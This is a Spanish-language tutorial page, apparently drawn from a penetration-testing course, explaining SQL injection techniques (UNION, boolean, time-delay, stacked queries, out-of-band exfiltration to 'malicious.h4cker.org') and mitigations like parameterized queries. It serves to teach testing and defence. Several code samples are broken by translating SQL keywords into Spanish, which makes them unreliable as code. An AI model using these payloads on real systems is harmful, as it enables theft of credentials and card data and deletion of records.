---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SQL Injection

En un ataque de inyección, el atacante inserta o _inyecta_ consultas SQL parciales o completas a través de la aplicación web. El atacante inyecta comandos SQL en campos de entrada de una aplicación o una URL para ejecutar comandos SQL predefinidos.

**Una breve introducción a SQL**

Como sabrá, las siguientes son algunas de las sentencias (comandos) SQL más comunes:

* **SELECT:** Se utiliza para obtener datos de una base de datos.
* **UPDATE:** Se utiliza para actualizar datos en una base de datos.
* **DELETE:** Se utiliza para eliminar datos de una base de datos.
* **INSERT INTO:** Se utiliza para insertar nuevos datos en una base de datos.
* **CREATE DATABASE:** Se utiliza para crear una nueva base de datos.
* **ALTER DATABASE:** Se utiliza para modificar una base de datos.
* **CREATE TABLE:** Se utiliza para crear una nueva tabla.
* **ALTER TABLE:** Se utiliza para modificar una tabla.
* **DROP TABLE:** Se utiliza para eliminar una tabla.
* **CREATE INDEX:** Se utiliza para crear un índice o un elemento clave de búsqueda.
* **DROP INDEX:** Se utiliza para eliminar un índice.

Normalmente, las declaraciones SQL se dividen en las siguientes categorías:

* Declaraciones del lenguaje de definición de datos (DDL)
* Declaraciones del lenguaje de manipulación de datos (DML)
* Declaraciones de control de transacciones
* Declaraciones de control de sesión
* Declaraciones de control del sistema
* Sentencias SQL incorporadas



Uno de los primeros pasos cuando encuentra vulnerabilidades de inyección SQL es comprender cuándo interactúa la aplicación con una base de datos. Normalmente, esto se hace con formularios de autenticación web, motores de búsqueda y sitios interactivos, como sitios de comercio electrónico.

Puede hacer una lista de todos los campos de entrada cuyos valores podrían usarse para elaborar una consulta SQL válida. Esto incluye intentar identificar y manipular campos ocultos de solicitudes **POST** y luego probarlos por separado, intentando interferir con la consulta y generar un error. Como parte de las pruebas de penetración, debes prestar atención a los encabezados **HTTP** y las **cookies.**

Como probador de penetración, puede comenzar agregando una comilla simple **(')** o un punto y coma **( ; )** al campo o parámetro en un formulario web. La comilla simple se utiliza en SQL como terminador de cadena. Si la aplicación no lo filtra correctamente, es posible que pueda recuperar registros o información adicional que pueda ayudar a mejorar su consulta o declaración.

También puede utilizar delimitadores de comentarios (como **--** o **/\* \*/** ), así como otras palabras clave SQL, incluidos los operadores **AND** y **OR** . Otra prueba sencilla es insertar una cadena donde se espera un número.

> Se monitorear todas las respuestas de una aplicación. Esto incluye inspeccionar el código fuente HTML o JavaScript. En algunos casos, los errores que regresan de la aplicación están dentro del código fuente y se muestran al usuario.

**Categorías de inyección SQL**

Los ataques de inyección SQL se pueden dividir en las siguientes categorías:

* **Inyección SQL en banda:** Con este tipo de inyección, el atacante obtiene los datos utilizando el mismo canal que se utiliza para inyectar el código SQL. Esta es la forma más básica de ataque de inyección SQL, donde los datos se vuelcan directamente en una aplicación web (o página web).
* **Inyección SQL fuera de banda:** con este tipo de inyección, el atacante recupera datos utilizando un canal diferente. Por ejemplo, se podría enviar al atacante un correo electrónico, un texto o un mensaje instantáneo con los resultados de la consulta; o el atacante podría enviar los datos comprometidos a otro sistema.
* **Inyección SQL ciega (o inferencial):** Con este tipo de inyección, el atacante no hace que la aplicación muestre ni transfiera ningún dato; más bien, el atacante puede reconstruir la información enviando declaraciones específicas y discerniendo el comportamiento de la aplicación y la base de datos.



Existen cinco técnicas que se pueden utilizar para explotar las vulnerabilidades de inyección SQL:

* **Operador de unión:** normalmente se utiliza cuando una vulnerabilidad de inyección SQL permite que una instrucción **SELECT** combine dos consultas en un único resultado o un conjunto de resultados.
* **Booleano:** se utiliza para verificar si ciertas condiciones son verdaderas o falsas.
* **Técnica basada en errores:** se utiliza para forzar a la base de datos a generar un error con el fin de mejorar y refinar un ataque (inyección).
* **Técnica fuera de banda:** normalmente se utiliza para obtener registros de la base de datos utilizando un canal diferente. Por ejemplo, es posible realizar una conexión HTTP para enviar los resultados a un servidor web diferente o a una máquina local que ejecute un servicio web.
* **Retraso de tiempo:** es posible utilizar comandos de la base de datos para retrasar las respuestas. Un atacante puede utilizar esta técnica cuando no obtiene resultados o mensajes de error de la aplicación.

La inyección SQL también se puede aprovechar manipulando una cadena de consulta URL, como se demuestra aquí:

```
.php?id=99 AND 1=2
```

Esta aplicación vulnerable luego realiza la siguiente consulta SQL:

```
SELECT * FROM products WHERE product_id=99 AND 1=2
```

Luego, el atacante puede ver un mensaje que especifica que no hay contenido disponible o que hay una página en blanco. Luego, el atacante puede enviar una consulta válida para ver si la aplicación arroja algún resultado, como se muestra aquí:

```
.php?id=99 AND 1=1
```

Algunos marcos de aplicaciones web permiten múltiples consultas a la vez. Un atacante puede aprovechar esa capacidad para realizar exploits adicionales, como agregar registros. La siguiente declaración, por ejemplo, agrega un nuevo usuario a la tabla de usuarios de la base de datos:

```
.php?id=99; INSERT INTO users(username) VALUES ('user')
```

**Huellas digitales de bases de datos**

Para ejecutar con éxito consultas complejas y explotar diferentes combinaciones de inyecciones SQL, primero debe tomar huellas digitales de la base de datos. El lenguaje SQL está definido en el estándar ISO/IEC 9075. Sin embargo, las bases de datos se diferencian entre sí en términos de su capacidad para ejecutar comandos adicionales, el uso de funciones para recuperar datos y otras características. Al realizar ataques de inyección SQL más avanzados, un atacante necesita saber qué base de datos back-end utiliza la aplicación (por ejemplo, Oracle, MariaDB, MySQL, PostgreSQL).

Una de las formas más sencillas de tomar huellas dactilares de una base de datos es prestar mucha atención a cualquier error que devuelva la aplicación, como se demuestra en el siguiente mensaje de error de sintaxis de una base de datos MySQL:

```
  Error 1064 de MySQL
```

Si está intentando tomar huellas digitales de una base de datos y no aparece ningún mensaje de error en la base de datos, puede intentar usar la concatenación, Un

**a técnica de explotación de la UNIÓN**

El operador SQL **UNION** se utiliza para combinar los conjuntos de resultados de dos o más declaraciones **SELECT** , como se muestra aquí:

```
  SELECCIONE el código postal DE h4cker_customers UNION SELECCIONE el código postal DE h4cker_suppliers;
```

De forma predeterminada, el operador **UNION** selecciona solo valores distintos. Puede utilizar el operador **UNION ALL** si desea permitir valores duplicados.

**NOTA** Puede practicar el uso del operador **UNION de forma interactiva con la herramienta Try-SQL Editor, en** [_https://www.w3schools.com/sql/sql\_union.asp_](https://www.w3schools.com/sql/sql\_union.asp) .

Los atacantes pueden utilizar el operador **UNION** en ataques de inyecciones SQL para unir consultas. El objetivo principal de esta estrategia es obtener los valores de columnas de otras tablas. El siguiente es un ejemplo de un ataque de inyección SQL basado en **UNION** :

```
  SELECCIONE el código postal DE h4cker_customers DONDE zip=1 UNION ALL SELECCIONE la tarjeta de crédito DE los pagos
```

En este ejemplo, el atacante une el resultado de la consulta original con todos los números de tarjetas de crédito en la tabla de pagos.

La Figura 6-11 muestra un ejemplo del uso de un operando **UNION** en la aplicación de vulnerabilidad WebGoat para simular un ataque de inyección SQL. El ejemplo muestra la siguiente cadena ingresada en el formulario web:

```
  omar' UNION SELECT 1,nombre_usuario,contraseña,'1','1','1',1 FROM usuario_sistema_datos --
```

_**Figura 6-11**_ _: Ejemplo de un operando **UNION**_ _en un ataque de inyección SQL_



El siguiente es un ejemplo de un ataque de inyección SQL basado en **UNION** utilizando una URL:

```
https://store.h4cker.org/buyme.php?id=1234' UNION SELECT 1, nombre_usuario,contraseña,'1','1','1',1 FROM user_system_data --
  
```

**Booleanos en ataques de inyección SQL**

La técnica booleana se utiliza normalmente en ataques de inyección SQL ciega. En las vulnerabilidades de inyección SQL ciega, la aplicación vulnerable normalmente no devuelve un error de SQL, pero podría devolver un mensaje HTTP 500, un mensaje 404 o una redirección. Es posible utilizar consultas booleanas en una aplicación para intentar comprender el motivo de dichos códigos de error.

La Figura 6-12 muestra un ejemplo de una inyección SQL ciega utilizando la aplicación DVWA intencionalmente vulnerable.

_**Figura 6-12**_ _: Ejemplo de un ataque de inyección SQL ciega_



**SUGERENCIA** Pruébelo usted mismo descargando DVWA o implementando WebSploit Labs en websploit.org.

**Explotación fuera de banda**

La técnica de explotación fuera de banda es muy útil cuando se explota una vulnerabilidad de inyección SQL ciega. Puede utilizar las funciones del sistema de gestión de bases de datos (DBMS) para ejecutar una conexión fuera de banda para obtener los resultados del ataque de inyección SQL ciega. La Figura 6-13 muestra cómo un atacante podría explotar una vulnerabilidad de inyección SQL ciega en store.h4cker.org y luego obligar al servidor víctima a enviar los resultados de la consulta (datos comprometidos) a otro servidor (malicious.h4cker.org).

_**Figura 6-13**_ _: Ejemplo de un ataque fuera de banda_

tienda.h4cker.org2La víctima envía los resultados a un servidor diferente.malicioso.h4cker.org1El atacante aprovecha una vulnerabilidad de inyección SQL ciega.Agresor

Digamos que la cadena SQL maliciosa es la siguiente:

```
https://store.h4cker.org/buyme.php?id=8||UTL_HTTP.request('malicious.h4cker.org')||(SELECCIONE usuario DE DUAL)--
```

En este ejemplo, el atacante utiliza el valor 8 combinado con el resultado de la función **UTL\_HTTP.request** de Oracle .



**SUGERENCIA** Para realizar este ataque, puede configurar un servidor web como NGINX o Apache o usar Netcat para iniciar un escucha (por ejemplo, **nc -lvp 80** ). Uno de los usos más comunes de Netcat para las pruebas de penetración implica la creación de shells inversos y enlazados. Un _shell inverso_ es un shell iniciado desde el sistema de la víctima hacia el atacante. Se configura un shell de enlace en el sistema de la víctima y se "vincula" a un puerto específico para escuchar una conexión entrante del atacante. Un shell de enlace a menudo se denomina _puerta trasera_ .

Para obtener hojas de referencia que pueden ayudarle a familiarizarse con diferentes comandos y utilidades útiles (incluido Netcat), consulte [_http://h4cker.org/cheat_](http://h4cker.org/cheat) . Aprenderá más sobre Netcat y shells inversos y vinculados en el Módulo 8, “Realización de técnicas posteriores a la explotación”.

**Consultas apiladas**

En una consulta SQL normal, puede utilizar un punto y coma para especificar que se ha llegado al final de una declaración y lo que sigue es una nueva. Esta técnica le permite ejecutar múltiples declaraciones en la misma llamada a la base de datos. **Las consultas UNION** utilizadas en ataques de inyección SQL se limitan a declaraciones **SELECT .** Sin embargo, _**las consultas apiladas**_ se pueden utilizar para ejecutar cualquier instrucción o procedimiento SQL. Un ataque típico que utilice esta técnica podría especificar una declaración de entrada maliciosa como la siguiente:

```
1; ELIMINAR DE clientes
```

La aplicación y la base de datos vulnerables procesan esta declaración como la siguiente consulta SQL:

```
SELECCIONE * DE clientes DONDE customer_id=1; ELIMINAR DE clientes
```

**La técnica de inyección SQL con retardo de tiempo**

Cuando se intenta explotar una inyección SQL ciega, la técnica booleana es muy útil. Otro truco consiste en inducir también un retraso en la respuesta, lo que indica que el resultado de la consulta condicional es verdadero.

**NOTA** La técnica de retardo de tiempo varía de un tipo/proveedor de base de datos a otro.

El siguiente es un ejemplo del uso de la técnica de retardo de tiempo contra un servidor MySQL:

```
https://store.h4cker.org/buyme.php?id=8 AND IF(version() like '8%', sleep(10), 'false'))--
```

En este ejemplo, la consulta verifica si la versión de MySQL es 8.x y luego obliga al servidor a retrasar la respuesta 10 segundos. El atacante puede aumentar el tiempo de demora y monitorear las respuestas. El atacante podría incluso establecer el parámetro de suspensión en un valor alto, ya que no es necesario esperar tanto y luego simplemente cancelar la solicitud después de unos segundos.

**Examinar una inyección SQL de procedimiento almacenado**

Un _procedimiento almacenado_ es una o más declaraciones SQL o una referencia a un servidor SQL. Los procedimientos almacenados pueden aceptar parámetros de entrada y devolver múltiples valores en forma de parámetros de salida al programa que realiza la llamada. También pueden contener declaraciones de programación que ejecutan operaciones en la base de datos (incluida la llamada a otros procedimientos).

Si un servidor SQL no desinfecta la entrada del usuario, es posible ingresar declaraciones SQL maliciosas que se ejecutarán dentro del procedimiento almacenado. El siguiente ejemplo ilustra el concepto de procedimiento almacenado:

```
  Crear procedimiento user_login @username varchar(20), @passwd varchar(20) Como Declarar @sqlstring varchar(250) Establecer @sqlstring = ' Seleccionar 1 de los usuarios Donde nombre de usuario = ' + @username + ' y passwd = ' + @passwd exec (@sqlstring) Ir
```

Al ingresar **omar o 1=1' alguna contraseña** en una aplicación vulnerable donde la entrada no está desinfectada, un atacante podría obtener la contraseña y otra información confidencial de la base de datos.

**NOTA** En el Módulo 10, aprenderá sobre herramientas como Burp Suite, BeEF y SQLmap, que pueden ayudar a automatizar la evaluación de una aplicación web y ayudarlo a encontrar vulnerabilidades de inyección SQL.

Puede utilizar herramientas como _**SQLmap**_ para automatizar un ataque de inyección SQL. SQLmap viene instalado de forma predeterminada en Kali Linux y Parrot OS. Además, puedes descargarlo desde [_https://sqlmap.org_](https://sqlmap.org/) e instalarlo en cualquier sistema Linux compatible.

**Mitigaciones de inyección SQL**

La validación de entradas es una parte importante para mitigar los ataques de inyección SQL. La mejor mitigación para las vulnerabilidades de inyección SQL es utilizar consultas inmutables, como las siguientes:

* consultas estáticas
* Consultas parametrizadas
* Procedimientos almacenados (si no generan SQL dinámico)

Las consultas inmutables no contienen datos que puedan interpretarse. En algunos casos, procesan los datos como una entidad única vinculada a una columna sin interpretación.

Los siguientes son dos ejemplos de consultas estáticas:

```
  seleccione * de contactos; seleccione * de usuarios donde usuario = "omar";
```

Los siguientes son ejemplos de consultas parametrizadas:

```
  Consulta de cadena = "SELECCIONAR * DE usuarios DONDE nombre =?"; Declaración PreparedStatement = conexión.prepareStatement (consulta); declaración.setString(1, nombre de usuario); Resultados del conjunto de resultados = declaración.executeQuery();
```



**SUGERENCIA** OWASP tiene un gran recurso que explica las mitigaciones de SQL en detalle; consulte [_https://www.owasp.org/index.php/SQL\_Injection\_Prevention\_Cheat\_Sheet_](https://www.owasp.org/index.php/SQL\_Injection\_Prevention\_Cheat\_Sheet) .

La API de seguridad empresarial de OWASP (ESAPI) es otro gran recurso. Es una biblioteca de control de seguridad de aplicaciones web de código abierto que permite a las organizaciones crear aplicaciones de menor riesgo. ESAPI proporciona orientación y controles que mitigan la inyección SQL, XSS, CSRF y otras vulnerabilidades de seguridad de aplicaciones web que aprovechan las fallas de validación de entrada. Puede obtener más información sobre ESAPI en [_https://owasp.org/www-project-enterprise-security-api/_](https://owasp.org/www-project-enterprise-security-api/) .

<mark style="color:red;">**Recursos**</mark>

{% embed url="https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-what-is-sql-injection/sql-injection/what-is-sql-injection-sqli" %}

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" %}

{% embed url="https://portswigger.net/web-security/sql-injection" %}

{% embed url="https://owasp.org/www-community/attacks/SQL_Injection" %}

{% embed url="https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-injection?view=sql-server-ver16" %}
